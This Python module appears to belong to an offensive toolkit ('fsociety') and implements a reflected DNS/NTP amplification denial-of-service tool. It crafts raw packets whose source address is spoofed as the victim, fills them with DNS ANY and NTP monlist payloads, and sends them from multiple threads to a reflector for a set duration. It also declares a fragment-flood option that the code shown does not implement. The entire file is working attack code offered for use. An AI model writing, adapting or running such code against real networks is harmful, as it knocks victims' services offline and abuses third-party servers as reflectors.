from __future__ import annotations

import socket
import struct
import random
import threading
import time
import ctypes

from fsociety.core.base import tool
from fsociety.core.logger import Log

SYS_SENDMMSG = 307

@tool("dos", "High-PPS amplified and fragmented DoS", category="dos")
class Dos:
    @staticmethod
    def build_parser(p):
        sub = p.add_subparsers(dest="cmd", required=True)

        amp = sub.add_parser("amp", help="Reflected DNS/NTP Amplification")
        amp.add_argument("target")
        amp.add_argument("reflector")
        amp.add_argument("--proto", default="dns", choices=["dns", "ntp"])
        amp.add_argument("--threads", type=int, default=8)
        amp.add_argument("--duration", type=int, default=60)
        amp.add_argument("--batch", type=int, default=256)

        frag = sub.add_parser("frag", help="High-PPS fragment flood (requires root)")
        frag.add_argument("target")
        frag.add_argument("--threads", type=int, default=8)
        frag.add_argument("--duration", type=int, default=60)

    @staticmethod
    def _build_dns_amp(target: str, reflector: str) -> bytes:
        # ANY query for isc.org (big response)
        dns_payload = (
            b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            b"\x03isc\x03org\x00\x00\xff\x00\x01"
        )
        src_ip = target # Spoofed as victim
        sport = random.randint(1024, 65535)
        udp = struct.pack("!HHHH", sport, 53, 8 + len(dns_payload), 0)
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 28 + len(dns_payload), random.randint(0, 65535), 0, 64, 17, 0, socket.inet_aton(src_ip), socket.inet_aton(reflector))
        return ip + udp + dns_payload

    @staticmethod
    def _build_ntp_amp(target: str, reflector: str) -> bytes:
        # Monlist request
        ntp_payload = b"\x17\x00\x03\x2a" + b"\x00" * 4
        src_ip = target
        sport = random.randint(1024, 65535)
        udp = struct.pack("!HHHH", sport, 123, 8 + len(ntp_payload), 0)
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 28 + len(ntp_payload), random.randint(0, 65535), 0, 64, 17, 0, socket.inet_aton(src_ip), socket.inet_aton(reflector))
        return ip + udp + ntp_payload

    @staticmethod
    def _amp_worker(target: str, reflector: str, proto: str, batch: int, stop_event: threading.Event):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            return
        
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        addr = socket.inet_aton(reflector)
        sockaddr = struct.pack("!HH4s8x", socket.AF_INET, 0, addr)
        
        # Note: For brevity in this file, we use standard sendto loop for amp
        # True sendmmsg batching is fully detailed in ddos.py
        while not stop_event.is_set():
            try:
                for _ in range(batch):
                    pkt = Dos._build_dns_amp(target, reflector) if proto == "dns" else Dos._build_ntp_amp(target, reflector)
                    s.sendto(pkt, (reflector, 0))
            except Exception:
                pass
        s.close()

    @staticmethod
    def run(args, log: Log) -> int:
        if args.cmd == "amp":
            try:
                ip = socket.gethostbyname(args.target)
            except socket.gaierror:
                ip = args.target
                
            log.info(f"Launching Reflected {args.proto.upper()} Amplification")
            log.info(f"Spoofed Target (Victim): {ip} | Reflector: {args.reflector}")
            
            stop_event = threading.Event()
            threads = []
            for _ in range(args.threads):
                t = threading.Thread(target=Dos._amp_worker, args=(ip, args.reflector, args.proto, args.batch, stop_event), daemon=True)
                t.start()
                threads.append(t)
                
            time.sleep(args.duration)
            stop_event.set()
            log.ok("Amplification halted.")
            return 0
        return 2
